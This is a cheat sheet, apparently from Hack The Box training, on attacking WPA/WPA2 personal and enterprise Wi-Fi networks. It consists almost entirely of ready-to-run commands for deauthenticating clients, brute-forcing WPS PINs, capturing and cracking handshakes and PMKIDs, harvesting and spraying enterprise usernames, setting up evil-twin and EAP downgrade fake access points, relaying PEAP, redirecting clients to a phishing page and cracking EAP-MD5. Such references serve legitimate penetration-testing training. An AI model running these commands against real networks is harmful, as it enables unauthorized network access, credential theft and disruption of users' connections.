{"title": "Attacking WPA_WPA2 Wi-Fi Networks", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/attacking-wpawpa2-wi-fi-networks", "html": "<h1 id=\"attacking-wpawpa2-wi-fi-networks\">Attacking WPA_WPA2 Wi-Fi Networks</h1>\n<h2>WPA Personal Overview</h2>\n<h3 id=\"beacon\">Beacon</h3>\n<pre><code class=\"language-bash\">(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 8)</code></pre>\n<h3 id=\"probe-request\">Probe Request</h3>\n<pre><code class=\"language-bash\">(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 4)</code></pre>\n<h3 id=\"probe-response\">Probe Response</h3>\n<pre><code class=\"language-bash\">(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 5)</code></pre>\n<h3 id=\"authentication\">Authentication</h3>\n<pre><code class=\"language-bash\">(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 11)</code></pre>\n<h3 id=\"association-request\">Association Request</h3>\n<pre><code class=\"language-bash\">(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 0)</code></pre>\n<h3 id=\"association-response\">Association Response</h3>\n<pre><code class=\"language-bash\">(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 1)</code></pre>\n<h3 id=\"eapol-handshake\">EAPOL (Handshake)</h3>\n<pre><code class=\"language-bash\">eapol</code></pre>\n<h3 id=\"disassociation-deauthentication\">Disassociation ∨ Deauthentication</h3>\n<pre><code class=\"language-bash\">(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)</code></pre>\n<h2>Reconnaissance and Bruteforce</h2>\n<h3 id=\"enable-monitor-mode\">Enable monitor mode.</h3>\n<pre><code class=\"language-bash\">sudo airmon-ng start wlan0</code></pre>\n<h3 id=\"scan-for-available-wi-fi-networks-and-their-associated-clien\">Scan for available Wi-Fi networks and their associated clients.</h3>\n<pre><code class=\"language-bash\">sudo airodump-ng wlan0mon</code></pre>\n<h3 id=\"scan-for-wps-enabled-wi-fi-networks-using-airodump-ng\">Scan for WPS-enabled Wi-Fi networks (using airodump-ng).</h3>\n<pre><code class=\"language-bash\">sudo airodump-ng wlan0mon -c 1 --wps</code></pre>\n<h3 id=\"scan-for-wps-enabled-wi-fi-networks-using-wash-verbose-outpu\">Scan for WPS-enabled Wi-Fi networks (using wash + verbose output).</h3>\n<pre><code class=\"language-bash\">sudo wash -j -i wlan0mon</code></pre>\n<h3 id=\"see-which-vendor-is-associated-with-an-access-point-using-th\">See which vendor is associated with an access point, using the first half of the target AP&#x27;s MAC address.</h3>\n<pre><code class=\"language-bash\">grep -i &quot;84-1B-5E&quot; /var/lib/ieee-data/oui.txt</code></pre>\n<h3 id=\"turn-off-monitor-mode\">Turn off monitor mode.</h3>\n<pre><code class=\"language-bash\">sudo airmon-ng stop wlan0mon</code></pre>\n<h3 id=\"add-a-new-monitor-interface-using-iw\">Add a new monitor interface (using iw).</h3>\n<pre><code class=\"language-bash\">iw dev wlan0 interface add mon0 type monitor</code></pre>\n<h3 id=\"activate-the-new-interface\">Activate the new interface.</h3>\n<pre><code class=\"language-bash\">sudo ifconfig mon0 up</code></pre>\n<h3 id=\"perform-wps-pin-bruteforce-with-reaver\">Perform WPS-PIN bruteforce with Reaver.</h3>\n<pre><code class=\"language-bash\">sudo reaver -i mon0 -c 1 -b &lt;target_BSSID&gt;</code></pre>\n<h2>Cracking MIC (4-Way Handshake)</h2>\n<h3 id=\"enable-monitor-mode\">Enable monitor mode.</h3>\n<pre><code class=\"language-bash\">sudo airmon-ng start wlan0</code></pre>\n<h3 id=\"scan-for-available-wi-fi-networks-and-their-associated-clien\">Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file.</h3>\n<pre><code class=\"language-bash\">sudo airodump-ng wlan0mon -c 1 -w WPA</code></pre>\n<h3 id=\"perform-a-deauthentication-attack-against-a-connected-client\">Perform a deauthentication attack against a connected client.</h3>\n<pre><code class=\"language-bash\">sudo aireplay-ng -0 5 -a &lt;AP_MAC&gt; -c &lt;client_MAC&gt; wlan0mon</code></pre>\n<h3 id=\"verify-the-wpa-handshake\">Verify the WPA handshake.</h3>\n<pre><code class=\"language-bash\">cowpatty -c -r WPA-01.cap</code></pre>\n<h3 id=\"crack-the-psk-from-the-captured-wpa-handshake-using-cowpatty\">Crack the PSK from the captured WPA handshake using cowpatty.</h3>\n<pre><code class=\"language-bash\">cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s &lt;ESSID&gt;</code></pre>\n<h3 id=\"crack-the-psk-from-the-captured-wpa-handshake-using-aircrack\">Crack the PSK from the captured WPA handshake using aircrack-ng.</h3>\n<pre><code class=\"language-bash\">aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap</code></pre>\n<h2>PMKID Attack</h2>\n<h3 id=\"enable-monitor-mode\">Enable monitor mode.</h3>\n<pre><code class=\"language-bash\">sudo airmon-ng start wlan0</code></pre>\n<h3 id=\"scan-for-networks-vulnerable-to-the-pmkid-attack\">Scan for networks vulnerable to the PMKID attack.</h3>\n<pre><code class=\"language-bash\">sudo hcxdumptool -i wlan0mon --enable_status=3</code></pre>\n<h3 id=\"determine-bssid-of-the-vulnerable-network-using-its-essid\">Determine BSSID of the vulnerable network using its ESSID.</h3>\n<pre><code class=\"language-bash\">sudo airodump-ng wlan0mon --essid &lt;target_ESSID&gt;</code></pre>\n<h3 id=\"capture-the-targets-pmkid\">Capture the target&#x27;s PMKID.</h3>\n<pre><code class=\"language-bash\">hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=&lt;target_BSSID&gt; --filtermode=2 -o HTBPMKID.pcap</code></pre>\n<h3 id=\"convert-the-pcap-to-a-usable-hash-format\">Convert the pcap to a usable hash format.</h3>\n<pre><code class=\"language-bash\">hcxpcapngtool -o hash HTBPMKID.pcap</code></pre>\n<h3 id=\"crack-the-hash-using-hashcat\">Crack the hash (using Hashcat).</h3>\n<pre><code class=\"language-bash\">hashcat -m 22000 --force hash /opt/wordlist.txt</code></pre>\n<h3 id=\"display-the-cracked-password\">Display the cracked password.</h3>\n<pre><code class=\"language-bash\">hashcat -m 22000 --force hash /opt/wordlist.txt --show</code></pre>\n<h2>WPA Enterprise Reconnaissance</h2>\n<h3 id=\"enable-monitor-mode\">Enable monitor mode.</h3>\n<pre><code class=\"language-bash\">sudo airmon-ng start wlan0</code></pre>\n<h3 id=\"scan-for-available-wi-fi-networks-and-their-associated-clien\">Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file.</h3>\n<pre><code class=\"language-bash\">sudo airodump-ng wlan0mon -c 1 -w WPA</code></pre>\n<h3 id=\"extract-usernames-from-a-packet-capture-using-tshark\">Extract usernames from a packet capture (using tshark).</h3>\n<pre><code class=\"language-bash\">tshark -r WPA-01.cap -Y &#x27;(eap &amp;&amp; wlan.ra == 9c:9a:03:39:bd:7a) &amp;&amp; (eap.identity)&#x27; -T fields -e eap.identity</code></pre>\n<h3 id=\"extract-usernames-from-a-packet-capture-using-creap\">Extract usernames from a packet capture (using crEAP).</h3>\n<pre><code class=\"language-bash\">python2 /opt/crEAP/crEAP.py</code></pre>\n<h3 id=\"extract-the-handshake-certificate-from-packet-capture\">Extract the handshake certificate from packet capture.</h3>\n<pre><code class=\"language-bash\">bash /opt/pcapFilter.sh -f /home/wifi/WPA-01.cap -C</code></pre>\n<h3 id=\"identify-the-authentication-methods-available-to-the-user\">Identify the authentication methods  available to the user.</h3>\n<pre><code class=\"language-bash\">sudo bash /opt/EAP_buster/EAP_buster.sh HTB-Corp &#x27;HTB\\Ketty&#x27; wlan0mon</code></pre>\n<h2>Performing Bruteforce Attacks</h2>\n<h3 id=\"save-the-target-username-to-a-file\">Save the target username to a file.</h3>\n<pre><code class=\"language-bash\">echo &quot;HTB\\Sentinal&quot; &gt; user.txt</code></pre>\n<h3 id=\"execute-a-bruteforce-attack-using-air-hammerpy\">Execute a bruteforce attack using air-hammer.py.</h3>\n<pre><code class=\"language-bash\">sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -p /opt/rockyou.txt -u user.txt</code></pre>\n<h3 id=\"create-a-list-of-usernames-with-a-domain-prefix\">Create a list of usernames with a domain prefix.</h3>\n<pre><code class=\"language-bash\">cat /opt/statistically-likely-usernames/john.txt | awk &#x27;{print &quot;HTB\\\\&quot; $1}&#x27; &gt; domain_users.txt</code></pre>\n<h3 id=\"execute-a-password-spray-attack-using-air-hammerpy\">Execute a password spray attack using air-hammer.py</h3>\n<pre><code class=\"language-bash\">sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt</code></pre>\n<h3 id=\"resume-a-cancelled-attack\">Resume a cancelled attack.</h3>\n<pre><code class=\"language-bash\">sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt -s 65</code></pre>\n<h2>EAP Downgrade Attack</h2>\n<h3 id=\"generate-diffie-hellman-parameters\">Generate Diffie-Hellman parameters.</h3>\n<pre><code class=\"language-bash\">openssl dhparam -out dh.pem 2048</code></pre>\n<h3 id=\"generate-ca-private-key\">Generate CA private key.</h3>\n<pre><code class=\"language-bash\">openssl genrsa -out ca-key.pem 2048</code></pre>\n<h3 id=\"generate-ca-certificate\">Generate CA certificate.</h3>\n<pre><code class=\"language-bash\">openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem</code></pre>\n<h3 id=\"generate-server-private-key\">Generate server private key.</h3>\n<pre><code class=\"language-bash\">openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem</code></pre>\n<h3 id=\"generate-server-certificate\">Generate server certificate.</h3>\n<pre><code class=\"language-bash\">openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem</code></pre>\n<h3 id=\"start-the-fake-access-point-using-hostapd-mana\">Start the fake access point using hostapd-mana.</h3>\n<pre><code class=\"language-bash\">sudo hostapd-mana hostapd.conf</code></pre>\n<h3 id=\"generate-self-signed-certificates-automatically-with-eaphamm\">Generate self-signed certificates automatically with eaphammer.</h3>\n<pre><code class=\"language-bash\">/opt/eaphammer/eaphammer --cert-wizard</code></pre>\n<h3 id=\"start-the-fake-access-point-using-eaphammer\">Start the fake access point using eaphammer.</h3>\n<pre><code class=\"language-bash\">sudo /opt/eaphammer/eaphammer --interface wlan1 --negotiate balanced --auth wpa-eap --essid HTB-Corp --creds</code></pre>\n<h2>Enterprise Evil-Twin Attack</h2>\n<h3 id=\"make-a-copy-of-the-hostapd-wpe-configuration-file\">Make a copy of the hostapd-wpe configuration file.</h3>\n<pre><code class=\"language-bash\">cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf</code></pre>\n<h3 id=\"start-the-fake-access-point-using-hostapd-wpe\">Start the fake access point using hostapd-wpe.</h3>\n<pre><code class=\"language-bash\">sudo hostapd-wpe -c -k hostapd-wpe.conf</code></pre>\n<h3 id=\"generate-self-signed-certificates-automatically-using-eapham\">Generate self-signed certificates automatically using eaphammer.</h3>\n<pre><code class=\"language-bash\">/opt/eaphammer/eaphammer --cert-wizard</code></pre>\n<h3 id=\"start-the-fake-access-point-using-eaphammer\">Start the fake access point using eaphammer.</h3>\n<pre><code class=\"language-bash\">sudo /opt/eaphammer/eaphammer -i wlan1 -e HTB-Corp --auth wpa-eap --wpa-version 2</code></pre>\n<h3 id=\"crack-the-captured-netntlm-hash-using-hashcat\">Crack the captured NetNTLM hash using Hashcat.</h3>\n<pre><code class=\"language-bash\">hashcat -m 5500 -a 0 &lt;captured_hash&gt; wordlist.dict</code></pre>\n<h2>PEAP Relay Attack</h2>\n<h3 id=\"launch-the-fake-access-point-using-hostapd-mana\">Launch the fake access point using hostapd-mana.</h3>\n<pre><code class=\"language-bash\">sudo hostapd-mana ./hostapd.conf</code></pre>\n<h3 id=\"start-the-relay-by-initiating-wpa-sycophant\">Start the relay by initiating wpa-sycophant.</h3>\n<pre><code class=\"language-bash\">sudo /opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.config -i wlan2</code></pre>\n<h2>Attacking EAP-TLS Authentication</h2>\n<h3 id=\"make-a-copy-of-the-hostapd-wpe-configuration-file\">Make a copy of the hostapd-wpe configuration file.</h3>\n<pre><code class=\"language-bash\">cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf</code></pre>\n<h3 id=\"apply-the-patch-to-the-hostapd-26-source-code\">Apply the patch to the hostapd-2.6 source code.</h3>\n<pre><code class=\"language-bash\">cd /opt/hostapd-2.6 &amp;&amp; patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</code></pre>\n<h3 id=\"recompile-hostapd-with-the-updated-configuration\">Recompile hostapd with the updated configuration.</h3>\n<pre><code class=\"language-bash\">cd /opt/hostapd-2.6/hostapd &amp;&amp; make</code></pre>\n<h3 id=\"start-the-fake-access-point-using-the-recompiled-hostapd-wpe\">Start the fake access point using the recompiled hostapd-wpe.</h3>\n<pre><code class=\"language-bash\">sudo /opt/hostapd-2.6/hostapd/hostapd-wpe hostapd-wpe.conf</code></pre>\n<h3 id=\"redirect-clients-to-a-phishing-page-using-nagawpy\">Redirect clients to a phishing page using nagaw.py</h3>\n<pre><code class=\"language-bash\">sudo python2 nagaw.py -i wlan1 -o wlan2 -t demo</code></pre>\n<h2>Cracking EAP-MD5</h2>\n<h3 id=\"convert-the-request-challenge-eap-md5-value-into-colon-hexad\">Convert the Request Challenge EAP-MD5 value into Colon Hexadecimal format.</h3>\n<pre><code class=\"language-bash\">echo 776b900e685dea0230b41eec2010535c | sed &#x27;s/\\(..\\)/\\1:/g;s/:$//&#x27;</code></pre>\n<h3 id=\"convert-the-response-challenge-eap-md5-value-into-colon-hexa\">Convert the Response Challenge EAP-MD5 value into Colon Hexadecimal format.</h3>\n<pre><code class=\"language-bash\">echo 054ea58706a52f0c95fc47ccf11eb5a1 | sed &#x27;s/\\(..\\)/\\1:/g;s/:$//&#x27;</code></pre>\n<h3 id=\"perform-a-dictionary-attack-to-crack-the-eap-md5-hash\">Perform a dictionary attack to crack the EAP-MD5 hash.</h3>\n<pre><code class=\"language-bash\">eapmd5pass -w /opt/rockyou.txt -U administrator -C &lt;request_challenge&gt; -R &lt;response_challenge&gt; -E &lt;request_id&gt;</code></pre>", "excerpt": "Attacking WPA_WPA2 Wi-Fi Networks WPA Personal Overview Beacon (wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 8) Probe Request (wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 4) Probe…", "tags": ["htb", "cheatsheet"]}